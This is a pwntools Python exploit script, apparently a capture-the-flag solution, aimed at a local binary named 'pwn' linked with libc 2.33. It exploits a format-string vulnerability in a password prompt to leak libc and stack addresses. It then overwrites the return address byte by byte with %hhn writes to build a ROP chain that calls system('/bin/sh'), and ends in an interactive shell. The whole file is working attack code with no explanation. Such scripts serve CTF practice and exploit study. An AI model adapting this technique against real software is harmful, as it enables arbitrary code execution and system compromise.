from pwn import *
context.log_level="debug"
sh=process("./pwn")
sh.sendlineafter(b"Please let me know your name first.\n", b'aaa')
sh.sendlineafter(b"And please input your password\n", b"%9$p")
sh.recvuntil(b"Your password ")
leak_libc=int(sh.recvuntil(b"\n",True),16)
success("leak_libc:"+hex(leak_libc))
libcbase=leak_libc-0x28565
libc=ELF("./libc-2.33.so")
libc.address=libcbase

poprdi=0x0000000000028a55+libcbase
ret=poprdi+1
poprdx=0x00000000000c7f32+libcbase
binsh=libc.search(b"/bin/sh").__next__()
system=libc.sym['system']

def s(c):
    sh.sendlineafter(b"plz try again\n", c)
s(b'%6$p') #leak - 0x8=ret
sh.recvuntil(b"Your password ")
leak_stack=int(sh.recvuntil(b"\n",True),16)
ret_addr=leak_stack-0x8
success("ret_addr:"+hex(ret_addr))


payload=b'%'+str(ret_addr&0xffff).encode()+b'c'+b'%10$hn'
s(payload)


for i in range(6):
    payload=b'%'+str(p64(poprdi)[i]).encode()+b'c'+b'%39$hhn\x00'
    s(payload)
    payload=b'%'+str(p64(ret_addr)[0]+i+1).encode()+b'c'+b'%10$hhn\x00'
    s(payload)
cursor=ret_addr+8
for i in range(6):
    payload=b'%'+str(p64(cursor)[0]+i).encode()+b'c'+b'%10$hhn\x00'
    s(payload)
    payload=b'%'+str(p64(binsh)[i]).encode()+b'c'+b'%39$hhn\x00'
    s(payload)
cursor+=8
for i in range(6):
    payload=b'%'+str(p64(cursor)[0]+i).encode()+b'c'+b'%10$hhn\x00'
    s(payload)
    payload=b'%'+str(p64(poprdx)[i]).encode()+b'c'+b'%39$hhn\x00'
    s(payload)
cursor+=16
for i in range(6):
    payload=b'%'+str(p64(cursor)[0]+i).encode()+b'c'+b'%10$hhn\x00'
    s(payload)
    payload=b'%'+str(p64(ret)[i]).encode()+b'c'+b'%39$hhn\x00'
    s(payload)
cursor+=8
for i in range(6):
    payload=b'%'+str(p64(cursor)[0]+i).encode()+b'c'+b'%10$hhn\x00'
    s(payload)
    payload=b'%'+str(p64(system)[i]).encode()+b'c'+b'%39$hhn\x00'
    s(payload)
gdb.attach(sh)
pause()
s(b"fakepwn\x00")

sh.interactive()
#%10$n 1->2->3
#%39$n 2->3